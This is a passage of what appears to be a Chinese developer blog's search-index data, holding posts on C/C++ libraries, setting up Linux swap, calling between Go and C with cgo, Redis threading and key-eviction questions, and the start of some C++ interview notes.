Wrold]\n[变量类型]\n[数组]\n[结构体]\n[类]\n[内存管理]\n[多态]\n[指针]\n[引用]\n[模板]\n[STL容器]\n[正则表达式]\n[Lamda表达式]\n[线程]\n面试c#[介绍]\n[环境搭建]\n[Hello Csharp Wrold]\n[变量类型]\n[数组]\n[结构体]\n[类]\n[引用]\n[接口]\n[委托]\n[c#调用c接口]\ngo[介绍]\n[环境搭建]\n[Hello Go Wrold]\n[变量类型]\n[数组]\n[结构体]\n[容器]\n[逃逸分析]\n[cgo]\nlua[介绍]\n[环境搭建]\n[表]\n[类]\n[clua]\nbash[介绍]\n[环境搭建]\njava[介绍]\n[环境搭建]\njavascript[介绍]\n[环境搭建]\npython[介绍]\n[环境搭建]\nhtml[介绍]\n[环境搭建]\nasm[介绍]\n[环境搭建]\n数据结构与算法数据结构线性表[介绍]\n栈[介绍]\n队列[介绍]\n堆[介绍]\n串[kmp]\n树[介绍]\n[二叉树前序查找]\n[二叉树中序查找]\n[二叉树后序查找]\n[平衡二插树]\n[哈弗曼树]\n[红黑树]\n[b+树]\n图[介绍]\n常用算法排序[介绍]\n[冒泡排序]\n[插入排序]\n[选择排序]\n[希尔排序]\n[堆排序]\n查找算法[介绍]\n[顺序查找]\n[折半查找]\n[BFS]\n[DFS]\n基础知识编译脚本makefile[介绍]\ncmake[介绍]\n架构RPCgrpcRESTMVC设计模式单例模式观察者模式工厂模式代理模式模板模式客户端开发Unity3d[介绍]\nShaderURP框架XluaETJEngineVue[介绍]\nQt[介绍]\n[信号与槽]\nUnreal Engine[介绍]\nunlua\n服务端开发网络编程\nC++[介绍]\n[网络模型]\n[boost库]\n[libevent库]\n项目推荐[NF]\n[KBEngine]\nGo[介绍]\n[gin]\n[xorm]\nPython[介绍]\nflaskDotnet[介绍]\nNodejs[介绍]\n数据库Mysql[介绍]\n[环境搭建]\n[Mysql语句]\n[数据库备份与恢复]\nRedis[介绍]\n[环境搭建]\n[Redis命令]\n[数据库备份与恢复]\n网络协议Tcp[介绍]\nUdp[介绍]\nKcp[介绍]\nSSL[介绍]\n[ssl单向认证]\n[ssl双向认证]\nhttp &#x2F; https[介绍]\nWebsocket[介绍]\nDNS[介绍]\nSocks5[介绍]\nDNP3网络安全加解密算法DES[介绍]\n[采用Go实现DES]\nAES[介绍]\n[采用Go实现AES]\nRSA[介绍]\n[采用Go实现RSA]\nWeb安全XSS文件上传Sql注入SSRFCSRF二进制安全面经个人面经\n堆栈漏洞堆漏洞逻辑漏洞","categories":["cs"],"tags":["cs"]},{"title":"C++ 有哪些值得推荐的c/c++开源框架与库","url":"/2022/10/26/dev/language/cpp/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%BA%93/","content":"C++ 有哪些值得推荐的c&#x2F;c++开源框架与库框架Apache C++ Standard Library : 是一系列算法，容器，迭代器和其他基本组件的集合\nASL : Adobe源代码库提供了同行的评审和可移植的C++源代码库。\nBoost : 大量通用C++库的集合。\nBDE : 来自于彭博资讯实验室的开发环境。\nCinder : 提供专业品质创造性编码的开源开发社区。\nBxxomfort : 轻量级的，只包含头文件的库，将C++ 11的一些新特性移植到C++03中。\nDlib : 使用契约式编程和现代C++科技设计的通用的跨平台的C++库。\nEASTL : EA-STL公共部分\nffead-cpp : 企业应用程序开发框架\nFolly : 由Facebook开发和使用的开源C++库。\nJUCE : 包罗万象的C++类库，用于开发跨平台软件\nlibphenom : 用于构建高性能和高度可扩展性系统的事件框架。\nLibSourcey : 用于实时的视频流和高性能网络应用程序的C++11 evented IO\nLibU : C语言写的多平台工具库\nLoki : C++库的设计，包括常见的设计模式和习语的实现。\nMiLi : 只含头文件的小型C++库\nopenFrameworks : 开发C++工具包，用于创意性编码。\nQt : 跨平台的应用程序和用户界面框架\nReason : 跨平台的框架，使开发者能够更容易地使用Java，.Net和Python，同时也满足了他们对C++性能和优势的需求。\nROOT : 具备所有功能的一系列面向对象的框架，能够非常高效地处理和分析大量的数据，为欧洲原子能研究机构所用。\nSTLport : 是STL具有代表性的版本\nSTXXL : 用于额外的大型数据集的标准模板库。\nUltimate++ : C++跨平台快速应用程序开发框架\nWindows Template Library : 用于开发Windows应用程序和UI组件的C++库\nYomm11 : C++11的开放multi-methods.\n异步事件循环Boost.Asio : 用于网络和底层I&#x2F;O编程的跨平台的C++库。\nlibev : 功能齐全，高性能的时间循环，轻微地仿效libevent，但是不再像libevent一样有局限性，也修复了它的一些bug。\nlibevent : 事件通知库\nlibuv : 跨平台异步I&#x2F;O。\nlibco : 协程，微信支持8亿用户同时在线的底层IO库。功能强大\nntyco : 纯c版的协程框架，代码短小精悍，适合嵌入工程。\nlibgo : golang风格的并发框架，C++11实现协程库\n网络库ACE : C++面向对象网络变成工具包\nCasablanca : C++ REST SDK\ncpp-netlib : 高级网络编程的开源库集合\nDyad.c : C语言的异步网络\nlibCurl : 多协议文件传输库\nMongoose : 非常轻量级的网络服务器\nMuduo : 用于Linux多线程服务器的C++非阻塞网络库\nnet_skeleton : C&#x2F;C++的TCP 客户端&#x2F;服务器库\nWAFer : 基于C语言的超轻型软件平台，用于可扩展的服务器端和网络应用。 对于C编程人员，可以考虑node.js\nOnion : C语言HTTP服务器库，其设计为轻量级，易使用。\nPOCO : 用于构建网络和基于互联网应用程序的C++类库，可以运行在桌面，服务器，移动和嵌入式系统。\nRakNet : 为游戏开发人员提供的跨平台的开源C++网络引擎。\nTufao : 用于Qt之上的C++构建的异步Web框架。\nWebSocket++ : 基于C++&#x2F;Boost Aiso的websocket 客户端&#x2F;服务器库\nZeroMQ : 高速，模块化的异步通信库\nTCP&#x2F;IP协议栈f-stack : 腾讯开源的协议栈，基于DPDK的高性能用户态协议栈。\nNtyTcp : 单线程的协议栈的，基于netmap,DPDK,rawSocket的实现。\nLWIP : 针对 RAM 平台的精简版的 TCP&#x2F;IP 协议栈实现。\nmTCP : 针对多核系统的高可扩展性的用户空间 TCP&#x2F;IP 协议栈。\n4.4BSD : * nix的协议栈是源于4.4BSD的。\nWEB应用框架Nginx : 一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。\nLighttpd : 一款开源 Web 服务器软件，安全快速,符合行业标准,适配性强并且针对高配置环境进行了优化。\nLibmicrohttpd : GNU软件下的简单c库的Web服务器。API简单，快速。\nshttpd : 基于Mongoose的Web服务器框架。\nCivetWeb : 提供易于使用，强大的，C&#x2F;C++嵌入式Web服务器，带有可选的CGI，SSL和Lua支持。\nCppCMS : 免费高性能的Web开发框架（不是 CMS）.\nCrow : 一个C++微型web框架（灵感来自于Python Flask）\nKore : 使用C语言开发的用于web应用程序的超快速和灵活的web服务器&#x2F;框架。\nlibOnion : 轻量级的库，帮助你使用C编程语言创建web服务器。\nQDjango : 使用C++编写的，基于Qt库的web框架，试图效仿Django API，因此得此名。\nWt : 开发Web应用的C++库。\n标准库，算法与函数C++ Standard Library : 是一系列类和函数的集合，使用核心语言编写，也是C++ISO自身标准的一部分。\nStandard Template Library : 标准模板库, STL\nC POSIX library : POSIX系统的C标准库规范\nISO C++ Standards Committee : C++标准委员会\n音频库FMOD : 易于使用的跨平台的音频引擎和音频内容的游戏创作工具。\nMaximilian : C++音频和音乐数字信号处理库\nOpenAL : 开源音频库—跨平台的音频API\nOpus : 一个完全开放的，免版税的，高度通用的音频编解码器\nSpeex : 免费编解码器，为Opus所废弃\nTonic : C++易用和高效的音频合成\nVorbis : Ogg Vorbis是一种完全开放的，非专有的，免版税的通用压缩音频格式。\n生态学lisequence : 用于表示和分析群体遗传学数据的C++库。\nSeqAn : 专注于生物数据序列分析的算法和数据结构。\nVcflib : 用于解析和处理VCF文件的C++库\nWham : 直接把联想测试应用到BAM文件的基因结构变异。\n压缩bzip2 : 一个完全免费，免费专利和高质量的数据压缩\ndoboz : 能够快速解压缩的压缩库\nPhysicsFS : 对各种归档提供抽象访问的库，主要用于视频游戏，设计灵感部分来自于Quake3的文件子系统。\nKArchive : 用于创建，读写和操作文件档案（例如zip和 tar）的库，它通过QIODevice的一系列子类，使用gzip格式，提供了透明的压缩和解压缩的数据。\nLZ4 : 非常快速的压缩算法\nLZHAM : 无损压缩数据库，压缩比率跟LZMA接近，但是解压缩速度却要快得多。\nLZMA : 7z格式默认和通用的压缩方法。\nLZMAT : 及其快速的实时无损数据压缩库\nminiz : 单一的C源文件，紧缩&#x2F;膨胀压缩库，使用zlib兼容API，ZIP归档读写，PNG写方式。\nMinizip : Zlib最新bug修复，支持PKWARE磁盘跨越，AES加密和IO缓冲。\nSnappy : 快速压缩和解压缩\nZLib : 非常紧凑的数据流压缩库\nZZIPlib : 提供ZIP归档的读权限。\n并发性Boost.Compute : 用于OpenCL的C++GPU计算库\nBolt : 针对GPU进行优化的C++模板库\nC++React : 用于C++11的反应性编程库\nIntel TBB : Intel线程构件块\nLibclsph : 基于OpenCL的GPU加速SPH流体仿真库\nOpenCL : 并行编程的异构系统的开放标准\nOpenMP : OpenMP API\nThrust : 类似于C++标准模板库的并行算法库\nHPX : 用于任何规模的并行和分布式应用程序的通用C++运行时系统\nVexCL : 用于OpenCL&#x2F;CUDA 的C++向量表达式模板库。\n密码学Bcrypt : 一个跨平台的文件加密工具，加密文件可以移植到所有可支持的操作系统和处理器中。\nBeeCrypt : 快速的加密图形库，功能强大，接口方便。\nBotan : C++加密库\nCrypto++ : 一个有关加密方案的免费的C++库\nGnuPG : OpenPGP标准的完整实现\nGnuTLS : 实现了SSL，TLS和DTLS协议的安全通信库\nLibgcrypt : 基于GnuPG的加密图形库。\nLibmcrypt : 线程安全，提供统一的API。\nLibreSSL : 免费的SSL&#x2F;TLS协议，属于2014 OpenSSL的一个分支\nLibTomCrypt : 一个非常全面的，模块化的，可移植的加密工具\nlibsodium : 基于NaCI的加密库，固执己见，容易使用\nNettle : 底层的加密库\nOpenSSL : 一个强大的，商用的，功能齐全的，开放源代码的加密库。\nTiny AES128 in C : 用C实现的一个小巧，可移植的实现了AES128ESB的加密算法\n数据库hiberlite : 用于Sqlite3的C++对象关系映射\nhiredis : 用于Redis数据库的很简单的C客户端库\nLevelDB : 快速键值存储库\nLMDB : 符合数据库四大基本元素的嵌入键值存储\nMySQL++ : 封装了MySql的C API的C++ 包装器\nRocksDB : 来自Facebook的嵌入键值的快速存储\nSQLite : 一个完全嵌入式的，功能齐全的关系数据库，只有几百KB，可以正确包含到你的项目中。\nRedis : 一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库.\nMongoDB : 一个基于分布式文件存储的数据库\n调试Boost.Test : Boost测试库\nCatch : 一个很时尚的，C++原生的框架，只包含头文件，用于单元测试，测试驱动开发和行为驱动开发。\nCppUnit : 由JUnit移植过来的C++测试框架\nCTest : CMake测试驱动程序\nGoogleTest : 谷歌C++测试框架\nig-debugheap : 用于跟踪内存错误的多平台调试堆\nlibtap : 用C语言编写测试\nMemTrack : 用于C++跟踪内存分配\nMicroProfile : 跨平台的网络试图分析器\nminUnit : 使用C写的迷你单元测试框架，只使用了两个宏\nRemotery : 用于web视图的单一C文件分析器\nUnitTest++ : 轻量级的C++单元测试框架\n容器C++ B-Tree : 基于B树数据结构，实现命令内存容器的模板库\nHashmaps : C++中开放寻址哈希表算法的实现\n游戏引擎Cocos2d-x : 一个跨平台框架，用于构建2D游戏，互动图书，演示和其他图形应用程序。\nGrit : 社区项目，用于构建一个免费的游戏引擎，实现开放的世界3D游戏。\nlrrlicht : C++语言编写的开源高性能的实时#D引擎\nPolyCode : C++实现的用于创建游戏的开源框架（与Lua绑定）。\n图形库bgfx : 跨平台的渲染库\nCairo : 支持多种输出设备的2D图形库\nHorde3D : 一个小型的3D渲染和动画引擎\nmagnum : C++11和OpenGL 2D&#x2F;3D 图形引擎\nOgre 3D : 用C++编写的一个面向场景，实时，灵活的3D渲染引擎（并非游戏引擎）\nOpenSceneGraph : 具有高性能的开源3D图形工具包\nPanda3D : 用于3D渲染和游戏开发的框架，用Python和C++编写。\nSkia : 用于绘制文字，图形和图像的完整的2D图形库\nurho3d : 跨平台的渲染和游戏引擎。\n图像处理Boost.GIL : 通用图像库\nCImg : 用于图像处理的小型开源C++工具包\nFreeImage : 开源库，支持现在多媒体应用所需的通用图片格式和其他格式。\nGDCM : Grassroots DICOM 库\nITK : 跨平台的开源图像分析系统\nMagick++ : ImageMagick程序的C++接口\nOpenCV : 开源计算机视觉类库\ntesseract-ocr : OCR引擎\nVIGRA : 用于图像分析通用C++计算机视觉库\nVTK : 用于3D计算机图形学，图像处理和可视化的开源免费软件系统。\n国际化gettext : GNU gettext\nIBM ICU : 提供Unicode 和全球化支持的C、C++ 和Java库\nlibiconv : 用于不同字符编码之间的编码转换库\nJson库frozen : C&#x2F;C++的Jason解析生成器\nJansson : 进行编解码和处理Jason数据的C语言库\njbson : C++14中构建和迭代BSON data,和Json 文档的库\nJeayeSON : 非常健全的C++ JSON库，只包含头文件\nJSON++ : C++ JSON 解析器\njson-parser : 用可移植的ANSI C编写的JSON解析器，占用内存非常少\njson11 : 一个迷你的C++11 JSON库\njute : 非常简单的C++ JSON解析器\nibjson : C语言中的JSON解析和打印库，很容易和任何模型集成\nlibjson : 轻量级的JSON库\nPicoJSON : C++中JSON解析序列化，只包含头文件\nQt-Json : 用于JSON数据和 QVariant层次间的相互解析的简单类\nQJson : 将JSON数据映射到QVariant对象的基于Qt的库\nRepidJSON : 用于C++的快速JSON 解析生成器，包含SAX和DOM两种风格的API\nYAJL : C语言中快速流JSON解析库\n日志Boost.Log : 设计非常模块化，并且具有扩展性\neasyloggingpp : C++日志库，只包含单一的头文件。\nLog4cpp : 一系列C++类库，灵活添加日志到文件，系统日志，IDSA和其他地方。\ntemplog : 轻量级C++库，可以添加日志到你的C++应用程序中\n机器学习，人工智能btsk : 游戏行为树启动器工具\nEvolving Objects : 基于模板的，ANSI C++演化计算库，能够帮助你非常快速地编写出自己的随机优化算法。\nCaffe : 快速的神经网络框架\nCCV : 以C语言为核心的现代计算机视觉库\nmlpack : 可扩展的C++机器学习库\nOpenCV : 开源计算机视觉库\nRecommender : 使用协同过滤进行产品推荐&#x2F;建议的C语言库。\nSHOGUN : Shogun 机器学习工具\nsofia-ml : 用于机器学习的快速增量算法套件\n数学库Armadillo : 高质量的C++线性代数库，速度和易用性做到了很好的平衡。语法和MatlAB很相似\nblaze : 高性能的C++数学库，用于密集和稀疏算法。\nceres-solver : 来自谷歌的C++库，用于建模和解决大型复杂非线性最小平方问题。\nCGal : 高效，可靠的集合算法集合\nCML : 用于游戏和图形的免费C++数学库\nEigen : 高级C++模板头文件库，包括线性代数，矩阵，向量操作，数值解决和其他相关的算法。\nGMTL : 数学图形模板库是一组广泛实现基本图形的工具。\nGMP : 用于个高精度计算的C&#x2F;C++库，处理有符号整数，有理数和浮点数。\n多媒体库GStreamer : 构建媒体处理组件图形的库\nLIVE555 Streaming Media : 使用开放标准协议(RTP&#x2F;RTCP, RTSP, SIP) 的多媒体流库\nlibVLC : libVLC (VLC SDK)媒体框架\nQtAV : 基于Qt和FFmpeg的多媒体播放框架，能够帮助你轻而易举地编写出一个播放器\nSDL : 简单直控媒体层\nSFML : 快速，简单的多媒体库\n物理学Box2D : 2D的游戏物理引擎。\nBullet : 3D的游戏物理引擎。\nChipmunk : 快速，轻量级的2D游戏物理库\nLiquidFun : 2D的游戏物理引擎\nODE : 开放动力学引擎-开源，高性能库，模拟刚体动力学。\nofxBox2D : Box2D开源框架包装器。\nSimbody : 高性能C++多体动力学&#x2F;物理库，模拟关节生物力学和机械系统，像车辆，机器人和人体骨骼。\n机器人学MOOS-Ivp : 一组开源C++模块，提供机器人平台的自主权，尤其是自主的海洋车辆。\nMRPT : 移动机器人编程工具包\nPCL : 点云库是一个独立的，大规模的开放项目，用于2D&#x2F;3D图像和点云处理。\nRobotics Library : 一个独立的C++库，包括机器人动力学，运动规划和控制。\nRobWork : 一组C++库的集合，用于机器人系统的仿真和控制。\nROS : 机器人操作系统，提供了一些库和工具帮助软件开发人员创建机器人应用程序。\n科学计算FFTW : 用一维或者多维计算DFT的C语言库。\nGSL : GNU科学库。\n脚本ChaiScript : 用于C++的易于使用的嵌入式脚本语言。\nLua : 用于配置文件和基本应用程序脚本的小型快速脚本引擎。\nluacxx : 用于创建Lua绑定的C++ 11 API\nSWIG : 一个可以让你的C++代码链接到JavaScript，Perl，PHP，Python，Tcl和Ruby的包装器&#x2F;接口生成器\nV7 : 嵌入式的JavaScript 引擎。\nV8 : 谷歌的快速JavaScript引擎，可以被嵌入到任何C++应用程序中。\n序列化Cap’n Proto : 快速数据交换格式和RPC系统。\ncereal : C++11 序列化库\nFlatBuffers : 内存高效的序列化库\nMessagePack : C&#x2F;C++的高效二进制序列化库，例如 JSON\nProtoBuf : 协议缓冲，谷歌的数据交换格式。\nProtoBuf-c : C语言的协议缓冲实现\nSimpleBinaryEncoding : 用于低延迟应用程序的对二进制格式的应用程序信息的编码和解码。\nThrift : 高效的跨语言IPC&#x2F;RPC，用于C++，Java，Python，PHP，C#和其它多种语言中，最初由Facebook开发。\n视频库libvpx : VP8&#x2F;VP9编码解码SDK\nFFMpeg : 一个完整的，跨平台的解决方案，用于记录，转换视频和音频流。\nlibde265 : 开放的h.265视频编解码器的实现。\nOpenH264 : 开源H.364 编解码器。\nTheora : 免费开源的视频压缩格式。\nXML库Expat : 用C语言编写的xml解析库\nLibXml2 : Gnome的xml C解析器和工具包\nLibXml++ : C++的xml解析器\nPugiXML : 用于C++的，支持XPath的轻量级，简单快速的XML解析器。\nRapidXML : 试图创建最快速的XML解析器，同时保持易用性，可移植性和合理的W3C兼容性。\nTinyXML : 简单小型的C++XML解析器，可以很容易地集成到其它项目中。\nTinyXML2 : 简单快速的C++CML解析器，可以很容易集成到其它项目中。\nTinyXML++ : TinyXML的一个全新的接口，使用了C++的许多许多优势，模板，异常和更好的异常处理。\nXerces-C++ : 用可移植的C++的子集编写的XML验证解析器。\nref:\nhttps://zhuanlan.zhihu.com/p/71707672\n","categories":["language"],"tags":["cpp"]},{"title":"制作Linux Swap","url":"/2022/10/03/env/linux/myarch/%E5%88%B6%E4%BD%9CSwap/","content":"制作Swapref: https://wiki.archlinux.org/title/Swap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\n这里我要将nvme1n1p6分割32G作为swap\nNAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTSsda           8:0    0 931.5G  0 disk ├─sda1        8:1    0 467.5G  0 part /run/media/i0gan/mdisk1├─sda2        8:2    0 100.1G  0 part /run/media/i0gan/mdisk2└─sda3        8:3    0 363.9G  0 part /run/media/i0gan/mdisk3nvme1n1     259:0    0 476.9G  0 disk ├─nvme1n1p1 259:1    0   260M  0 part ├─nvme1n1p2 259:2    0    16M  0 part ├─nvme1n1p3 259:3    0   200G  0 part ├─nvme1n1p4 259:4    0    64M  0 part /boot/efi├─nvme1n1p5 259:5    0   150G  0 part /└─nvme1n1p6 259:6    0 126.6G  0 part /run/media/i0gan/datanvme0n1     259:7    0 476.9G  0 disk └─nvme0n1p1 259:8    0 476.9G  0 part /run/media/i0gan/windata\n\n\n\n采用fdisk对其进行分割\nsudo umount /dev/nvme1n1p6sudo fdisk /dev/nvme1n1 \n\nfdisk\n删除最后一个分区\n新建一个32g分区\n新建一个剩余空间的分区，然后写入。\n如下：\nNAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTSsda           8:0    0 931.5G  0 disk ├─sda1        8:1    0 467.5G  0 part ├─sda2        8:2    0 100.1G  0 part └─sda3        8:3    0 363.9G  0 part nvme1n1     259:0    0 476.9G  0 disk ├─nvme1n1p1 259:1    0   260M  0 part ├─nvme1n1p2 259:2    0    16M  0 part ├─nvme1n1p3 259:3    0   200G  0 part ├─nvme1n1p4 259:4    0    64M  0 part /boot/efi├─nvme1n1p5 259:5    0   150G  0 part /├─nvme1n1p6 259:6    0    32G  0 part └─nvme1n1p7 259:9    0  94.6G  0 part nvme0n1     259:7    0 476.9G  0 disk └─nvme0n1p1 259:8    0 476.9G  0 part /run/media/i0gan/windata\n\n获取分区uuid\nsudo blkid\n\n增加挂载，在&#x2F;etc&#x2F;fstab，我增加如下：\n# Static information about the filesystems.# See fstab(5) for details.# &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# /dev/nvme1n1p5UUID=69e9b6fd-9297-4f40-9bac-95927c702a36       /               ext4            rw,relatime     0 1# /dev/nvme1n1p4UUID=DEAA-48F6          /boot/efi       vfat            rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro        0 2# /dev/nvme1n1p6 swapUUID=a68cf37c-e7d8-4a45-ab70-fb3d6e9293d3 none swap defaults 0 0# /dev/nvme1n1p6 dataUUID=76ce9d39-7046-40a5-bd35-9ade1311aaf4       /run/media/i0gan/data   ext4    rw,user 0       2# /dev/nvme0n1p1 WinDataUUID=6E6F0D715669CDCF           /run/media/i0gan/windata        ntfs    rw,user 0       2\n\n重启就可以了\n","categories":["env"],"tags":["linux"]},{"title":"Go与C的互相调用","url":"/2022/09/28/dev/language/go/go%E4%B8%8Ec%E4%BA%92%E7%9B%B8%E8%B0%83%E7%94%A8/","content":"Go与C的互相调用官方参考：https://github.com/golang/go/wiki/cgo#function-pointer-callbacks\nGo调用C代码调用C的libc、go代码文件如下\n.├── c_module.c├── c_module.h└── main.go\n\nc_module.h\nextern int add(int a, int b);\n\nc_module.c\n#include &quot;c_module.h&quot;int add(int a, int b) &#123;    return a+b;&#125;\n\n编译为.so\ngcc -shared -o libc_module.so c_module.c\n\n记得在生成.so文件的名称前面加一个lib\nmain.go\npackage main//#cgo CFLAGS: -I.///#cgo LDFLAGS: -L$&#123;SRCDIR&#125;/ -lc_module////#include &quot;c_module.h&quot;import &quot;C&quot;import &quot;fmt&quot;func main() &#123;\tfmt.Println(C.add(10, 5))&#125;\n\n编译go代码\ngo build -o main main.go\n\n运行\nexport LD_LIBRARY_PATH=./ &amp;&amp; ./main\n\n输出\n15\n\n调用成功\nC代码调用Go代码调用go的libGo语言写的代码可以编译为动态库或静态库，之后C语言链接该动态库或静态库就可以调用Go语言写的代码。\npackage main;import &quot;C&quot;func main() &#123;&#125;//export Hellofunc Hello() string &#123;    return &quot;Hello&quot;&#125;//export Print_afunc Print_a() &#123;    println(&quot;aaaaa&quot;)&#125;\n\n上面的&#x2F;&#x2F;export 是一个特殊的注释，代表着导出该函数。\n编译\ngo build -buildmode=c-shared -o libgo.so main.go\n\n编译完后，会出现libgo.h 和libgo.so两个文件\n如果是想静态编译的话\ngo build -buildmode=c-archive -o libgo.a main.go\n\n编译完后，会出现libgo.h 和libgo.a两个文件\n这里写一个main.c来调用go\nmain.c\n#include &lt;stdio.h&gt;#include &quot;libgo.h&quot;void main()&#123;    GoString str;    str = Hello();    Print_a();    printf(&quot;%d\\n&quot;,(int)str.n);&#125;\n\n静态库编译\ngcc main.c libgo.a -lpthread -o main\n\n运行\n./mainaaaaa5\n\n成功的打印了aaaaa以及字符串的长度。\n动态库编译\nexport LD_LIBRARY_PATH=./gcc main.c -L./ -lgo -lpthread -o main\n\n\n\n查看链接情况\nldd main        linux-vdso.so.1 (0x00007ffc22882000)        libgo.so =&gt; ./libgo.so (0x00007ff893c0f000)        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff893a13000)        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff8939f0000)        /lib64/ld-linux-x86-64.so.2 (0x00007ff893d63000)\n\n正常的，运行\n./mainaaaaa5\n\n","categories":["language"],"tags":["go"]},{"title":"Redis常见问题","url":"/2022/09/28/dev/db/redis/Redis%E5%85%A5%E9%97%A8/","content":"Redis入门基本问题Redis到底是单线程的还是多线程的？Redis 6.0版本之前的单线程指的是其网络I&#x2F;O和键值对读写是由一个线程完成的\nRedis6.0引入的多线程指的是网络请求过程采用了多线程，而键值对读写命令仍然是单线程处理的，所以Redis依然是并发安全的。\n也就是只有网络请求模块和数据库操作模块是单线程的，其他的持久化、集群数据同步等是由额外线程执行的。\n\nRedis单线程为什么还能这么快？命令执行基于内存操作，一条命令在内存里操作的时间是几十纳秒\n命令执行是单线程操作，没有线程切换的开销\n基于IO多路复用机制提示Redis的I&#x2F;O利用率\n高效的数据存储结构：全局hash表以及多种高效的数据结构，比如全局hash表，跳表，压缩列表，双向链表，整数数组等等。\nRedis底层数据如何用跳表来存储的？跳表：将有序链表改造为支持近似“折半查找”算法，可以进行快速的插入、删除、查找操作。\n\nRedis Key过期了为什么内存没有释放？在使用Redis是，肯定经常使用SET命令\nSET除了可以设置key-value之外，还可以设置key的过期时间，比如：\nset i0gan abc ex 120ttl i0gan # 查看过期剩余时间\n\n此时如果你想修改key的值，但只是单纯的使用set命令，而没有加上过期时间的参数，那这个key的过期时间会被擦除。\nset i0gan abcttl i0gan(integer) -1 # 永久\n\n导致这个问题的原因在于：set命令如果不设置过期时间，那么redis会自动擦除这个key的过期时间。\n如果你发现了redis的内存持续增长，而且很多key原来设置了过期时间，后来发现过期时间丢失了，很有可能是因为这个原因导致的。\n这时你的Redis中就会存在大量不过期的key，消耗过多的内存资源。\n所以在使用set命令时，如果开始时设置了过期时间，那么之后修改这个key时，也务必加上过期时间的参数，避免过期时间丢失的问题。\nredis对于过期key的处理一般有惰性删除和定时删除两种策略\n\n惰性删除：当读&#x2F;写一个已经过期的key时，会触发惰性删除策略，判断key是否过期，如果过期了直接删除掉这个key\n定时删除：由于惰性删除策略无法保证冷数据及时杯删除，redis会定期（默认每100ms）主动删除一批已过期的key，这里的一批只是部分过期key，所以可能出现部分key已经过期但还没有被清理掉的情况，导致内存并没有被释放。\n\nRedis key 没有设置过期时间为什么被redis主动删除？当redis已用内存超过maxmemory限定时，会触发主动清理策略\n主动清理策略在redis4.0之前一共实现了6中淘汰策略，在4.0之后，又增加了2中策略，总共8种：\n针对设置了过期时间的key做处理\nvolatile-ttl:在筛选时，会针对设置了过期时间的键值对，根据过期时间的先后进行删除，越早过期的越先被删除。\nvolatile-random: 就像它的名称一样，在设置了过期时间的键值对中，进行随机删除。\nvolatile-lru:会使用LRU算法筛选设置了过期时间的键值对删除。\nvolatile-lfu: 会使用LFU算法筛选设置了过期时间的键值对删除。\n\n针对所有的key做处理\nallkeys-random: 从所有键值对中随机选择并删除数据\nallkeys-lru: 使用LRU算法在所有数据中进行筛选删除\nallkeys-lfu: 使用LFU算法在所有数据中进行筛选删除\n\n不处理\nnoeviction: 不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息”(error) OOM command not allowed when used memory”，此时Redis只响应读操作。\n\nRedis淘汰key的算法LRU与LFU区别LRU（Least Recently Used，最近最少使用)：淘汰很久没有被访问过的数据，以最近一次访问时间作为参考\nLFU（Least Frequently Used，最不经常使用）：淘汰最近一段时间被访问次数最少的数据，以次数作为参考，绝大多数情况我们都可以用LRU策略，当存在大量的热点缓存数据时，LFU可能更好点。\n删除Key的命令会阻塞Redis吗？这要得看删除的key是什么类型的，时间复杂度分别如下：\n删除单个字符串类型的Key，时间复杂度为O(1)\n删除单个列表、集合、有序或哈希表类型的key，时间复杂度为O(n)，n为数据结构内元素的数量。\n删除拥有较多元素的key的话，可能会出现阻塞的。\nRedis主从、哨兵、集群架构优缺点比较主从模式\n哨兵模式\n在redis3.0以前的版本要实现集群一般是借助哨兵sentinel弓弩来监控master节点的状态，如果master节点异常，则会做主从切换，将一台slave作为master,哨兵的配置略微复杂，并且性能和高可用性方面表现一般，特别是从主从切换的瞬间存在访问瞬断的情况，而且哨兵模式只有一个主节点对外提供服务，没法支持很高的并发，且单个节点内存也不宜设置得过大，否则会导致持久化文件过大，影响数据恢复或主从同步的效率。\n高可用集群模式\nredis集群是一个由多个主从节点群组的分布式服务器群，它具有复制、高可用性和分片的特性。Redis集群不需要sentinel哨兵也能完成节点移除和故障转移的功能。需要将每个节点设置成集群模式，这种集群模式没有中心节点，可水平拓展，根据官方文档称可以线性拓展到上万个节点（官方推荐不超过1000个节点）。redis集群的性能和高可用性均优于之前版本的哨兵模式，且集群配置也非常简单。\nRedis集群数据hash分片算法是怎么回事？","categories":["dev"],"tags":["redis"]},{"title":"Go Questions","url":"/2022/09/27/dev/language/go/questions/","content":"","categories":["language"],"tags":["go"]},{"title":"C++ Questions","url":"/2022/09/27/dev/language/cpp/questions/","content":"C++ Questions1. new、delete、malloc、free关系delete会调用对象的析构函数,和new对应free只会释放内存，new调用构造函数。malloc与free是C++&#x2F;C语言的标准库函数，new&#x2F;delete是C++的运算符。它们都可用于申请动态内存和释放内存。对于非内部数据类型的对象而言，光用maloc&#x2F;free无法满足动态对象的要求。对象在创建的同时要自动执行构造函数，对象在消亡之前要自动执行析构函数。由于malloc&#x2F;free是库函数而不是运算符，不在编译器控制权限之内，不能够把执行构造函数和析构函数的任务强加于malloc&#x2F;free。因此C++语言需要一个能完成动态内存分配和初始化工作的运算符new，以及一个能完成清理与释放内存工作的运算符delete。注意new&#x2F;delete不是库函数。\n2.delete与 delete []区别delete只会调用一次析构函数，而delete[]会调用每一个成员的析构函数。在More Effective C++中有更为详细的解释：“当delete操作符用于数组时，它为每个数组元素调用析构函数，然后调用operator delete来释放内存。”delete与new配套，delete []与new []配套\nMemTest *mTest1=new MemTest[10];MemTest *mTest2=new MemTest;Int *pInt1=new int [10];Int *pInt2=new int;delete[]pInt1; //-1-delete[]pInt2; 